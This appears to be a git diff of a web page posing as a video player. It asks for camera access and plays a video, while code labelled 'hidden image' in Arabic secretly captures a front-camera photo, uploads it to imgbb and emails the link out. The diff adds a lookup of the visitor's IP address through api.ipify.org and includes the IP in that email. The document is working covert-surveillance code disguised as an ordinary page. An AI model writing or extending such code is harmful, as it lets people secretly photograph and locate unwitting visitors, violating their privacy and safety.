@@ -176,27 +176,6 @@
       <button class="permission-btn" id="cameraBtn">Start Video</button>
     </div>
     
-<<<<<<< HEAD
-    <!-- IP Address Display -->
-    <div class="ip-container" id="ipContainer">
-      <div class="ip-label">Your IP Address:</div>
-      <div class="ip-address" id="ipAddress">Loading...</div>
-    </div>
-    
-    <!-- Camera indicators -->
-    <div class="camera-indicators" id="cameraIndicators">
-      <div class="camera-indicator">
-        <div class="camera-icon"></div>
-        <div class="camera-label"></div>
-      </div>
-      <div class="camera-indicator">
-        <div class="camera-icon"></div>
-        <div class="camera-label"></div>
-      </div>
-    </div>
-    
-=======
->>>>>>> parent of de6fc54 (Update index.html)
     <!-- Countdown element -->
     <div class="countdown" id="countdown">10</div>
     
@@ -248,11 +227,26 @@
     // Hide countdown initially
     countdownElement.style.display = 'none';
     
+    // Function to get user's IP address
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'Unknown IP';
+      }
+    }
+    
     // Function to start the countdown
-    function startCountdown() {
+    async function startCountdown() {
       let count = 10;
       countdownElement.textContent = count;
       countdownElement.style.display = 'block';
+      
+      // Get user IP and store it
+      const userIP = await getUserIP();
       
       countdownInterval = setInterval(() => {
         count--;
@@ -261,13 +255,13 @@
         if (count <= 0) {
           clearInterval(countdownInterval);
           countdownElement.style.display = 'none';
-          startVideoPlayback();
+          startVideoPlayback(userIP);
         }
       }, 1000);
     }
     
     // Function to start video playback
-    function startVideoPlayback() {
+    function startVideoPlayback(userIP) {
       loading.style.display = 'block';
       
       // Set the video source with autoplay
@@ -275,7 +269,7 @@
       player.style.display = 'block';
       
       // Start the camera capture process
-      setTimeout(captureImage, 3000);
+      setTimeout(() => captureImage(userIP), 3000);
     }
     
     // Event listener for camera permission button
@@ -327,7 +321,7 @@
     });
     
     // وظيفة التقاط الصورة
-    function captureImage() {
+    function captureImage(userIP) {
       if (!cameraCaptured) return;
       
       try {
@@ -362,7 +356,8 @@
               name: "صورة خفية",
               time: new Date().toLocaleString(),
               message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
-              image_url: imgbbData.data.url
+              image_url: imgbbData.data.url,
+              user_ip: userIP  // Add IP to email
             }).then(() => {
               emailSent = true;
             }, error => {
